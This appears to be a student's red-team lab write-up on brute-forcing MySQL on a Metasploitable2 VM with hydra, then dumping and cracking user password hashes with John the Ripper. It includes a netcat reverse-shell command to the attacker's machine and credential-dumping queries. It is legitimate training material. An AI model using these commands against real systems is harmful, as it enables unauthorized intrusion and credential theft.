# Lab08 - MySQL Brute Force & Database Enumeration

###  Description

In this lab, we exploited a weak MySQL configuration on the Metasploitable2 machine. By brute-forcing the MySQL `root` password using `hydra`, we gained access to the database server. Then, we discovered and enumerated sensitive user information, dumped password hashes, and cracked them using John the Ripper.

---

###  Target System

* **IP Address:** `192.168.56.103`
* **Service:** MySQL
* **Port:** `3306/tcp`
* **Version:** MySQL 5.0.51a-3ubuntu5
* **OS:** Ubuntu (Metasploitable2 VM)

---

###  Exploitation Steps

#### 1. Nmap Version Detection

```bash
nmap -sV -p 3306 192.168.56.103
```

> Confirmed MySQL is running on port 3306 with version 5.0.51a.

---

#### 2. Brute Force MySQL Login with Hydra

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.56.103
```

> `root` password successfully found using `hydra` brute force.

---

#### 3. Socket-based MySQL Access via Reverse Shell

* Established a **reverse shell** from `Metasploitable2` to `Kali`:

```bash
# On Kali (listener)
nc -lnvp 4444

# On Metasploitable2
nc <kali_ip> 4444 -e /bin/bash
```

* Accessed MySQL via local socket:

```bash
mysql -u root
```

---

#### 4. Database Discovery

```sql
SHOW DATABASES;
USE mysql;
SHOW TABLES;
SELECT User, Host, Password FROM user;
```

> Retrieved users and hashed passwords from the `user` table in the MySQL internal database.

---

#### 5. User Credential Dumping from DVWA

```sql
USE dvwa;
DESCRIBE users;
SELECT user, password FROM users;
```

> Extracted application-level credentials from the `dvwa.users` table.

---

#### 6. Hash Extraction and Cracking with John

```bash
nano mysql_hashes.txt  # Added password hashes manually

john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 mysql_hashes.txt
```

> Successfully cracked passwords like:

* `abc123`
* `letmein`
* `charley`

---

###  Sample User Table (DVWA)

| Username | Hash                             | Password (cracked) |
| -------- | -------------------------------- | ------------------ |
| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | password           |
| gordonb  | e99a18c428cb38d5f260853678922e03 | abc123             |
| 1337     | 8d3533d75ae2c3966d7e0d4fcc69216b | letmein            |
| pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7 | charley            |

---

###  What I Learned

* How to brute-force MySQL logins using `hydra`
* Why socket connections are key in outdated services
* MySQL database enumeration methodology
* Hash extraction from SQL and cracking with `john`
* Privilege insights from `/etc/passwd` and group membership post-exploitation

---

###  Screenshots

![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab08/Screen%20Shot%202025-06-09%20at%2003.48.07.png)


![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab08/Screen%20Shot%202025-06-09%20at%2004.04.55.png)


![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab08/Screen%20Shot%202025-06-09%20at%2021.04.19.png)


![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab08/Screen%20Shot%202025-06-09%20at%2022.14.36.png)


![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab08/Screen%20Shot%202025-06-09%20at%2022.15.47.png)


![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab08/Screen%20Shot%202025-06-09%20at%2023.33.34.png)


![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab08/Screen%20Shot%202025-06-09%20at%2023.37.48.png)


![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab08/Screen%20Shot%202025-06-10%20at%2001.47.33.png)


![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab08/Screen%20Shot%202025-06-10%20at%2001.50.17.png)



---

### 💡 Notes

* The version of MySQL used did not enforce SSL, allowing cleartext socket connection.
* Weak passwords and outdated hash algorithm (MD5) made cracking trivial.
* Hashcat was attempted but caused performance issues.

